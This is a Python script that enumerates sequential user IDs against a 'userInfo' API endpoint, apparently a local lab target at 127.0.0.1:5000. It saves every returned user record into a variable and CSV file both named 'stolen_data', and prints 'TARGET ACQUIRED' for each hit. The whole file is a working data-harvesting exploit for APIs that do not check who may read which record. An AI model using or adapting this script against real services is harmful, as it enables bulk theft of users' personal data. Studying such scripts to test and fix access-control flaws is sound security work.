import requests
import pandas as pd

# Define the API URL
API_PROTOCOL = "http"
API_IP = "127.0.0.1"
API_PORT = 5000
API_ENDPOINT = "userInfo"
api_url = f"{API_PROTOCOL}://{API_IP}:{API_PORT}/{API_ENDPOINT}"

# Initialize variables
stolen_data = {}
userid = 0
no_user_counter = 0
fail_counter = 0

# Create a session for making requests
session = requests.Session()

# Make a POST request for each possible userid, incrementing userid by 1 each time
while fail_counter < 5 and no_user_counter < 100:
    payload = {'userid': userid}

    try:
        response = session.post(api_url, json=payload)
        # print(response)

        # Check if the request was successful
        if response.status_code == 200:
            result_json = response.json()
            if result_json["found"]:
                stolen_data[userid] = result_json["data"]
                no_user_counter = 0
                print(f"TARGET ACQUIRED: User ID {userid} locked and loaded into the mainframe.")
            else:
                print(f"userid {userid} not found, proceeding to {userid+1}")
                no_user_counter += 1  # Stop querying if corresponding user not found 100 times in a row

            userid += 1
            continue

        print(f"Request failed for userid: {userid}, Status code: {response.status_code}")
        fail_counter += 1  # Stop querying if the number of failed requests hits the specified threshold (5)

    except requests.RequestException as e:
        print(f"An error occurred: {e}")
        fail_counter += 1  # Increase the failure counter if an error occurs

# Convert data to CSV format
stolen_df = pd.DataFrame().from_dict(stolen_data, orient='index')
stolen_df.to_csv("stolen_data.csv", index=False)
